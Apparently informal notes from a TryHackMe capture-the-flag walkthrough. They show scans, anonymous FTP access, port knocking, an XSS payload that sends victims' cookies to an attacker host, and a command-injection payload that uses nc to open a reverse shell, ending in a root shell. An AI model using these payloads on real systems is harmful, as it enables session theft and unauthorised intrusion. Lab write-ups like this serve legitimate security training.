
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.153.193
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

```
└─$ ftp m.thm        
Connected to m.thm.
220 (vsFTPd 3.0.3)
Name (m.thm:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36730|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||21274|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
-rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng
226 Directory send OK.
ftp> 


└─$ cat info.txt          
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore
                                                                                                                                                
┌──(kali㉿kali)-[~/tryhackme/misguidedghosts]
└─$ cat jokes.txt                       
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!


```

![[tryhackme1.png]]

```
┌──(kali㉿kali)-[~/tryhackme/misguidedghosts]
└─$ knock 10.64.162.195 7864 8273 9241 12007 60753

└─$ nmap -p 8080 -sC -sV 10.64.162.195
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-03 21:42 EST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for m.thm (10.64.162.195)
Host is up (0.35s latency).

PORT     STATE SERVICE  VERSION
8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
|_http-title: Misguided Ghosts
| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN
| Not valid before: 2020-08-11T16:52:11
|_Not valid after:  2021-08-11T16:52:11


```

```
└─$ gobuster dir -k -u https://10.64.162.195:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 2>/dev/null

/login                (Status: 200) [Size: 761]
```

After expore new website luck guess i login `zac:zac` and use this payload for cookie hajiack 

```
`&#x3C;scrscriptipt&#x3E; document.location='http://attacker ip:9001/XSS/grabber.php?c='+document.cookie &#x3C;/scrscriptipt&#x3E;`
```

open simple python server same port and get cokkie and using that login in browser wia editing cookie

```
gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.79.34:8080 -c "login=hayley_is_admin" -k 2>/dev/null

```

```
/photos?image=

image=.;nc${IFS}10.8.106.222${IFS}9001${IFS}-e${IFS}/bin/sh

```

```
nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.79.34 43255
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)


```

now invistigate deep find secreats in thse any folder and get ssh credintials and have to brute force
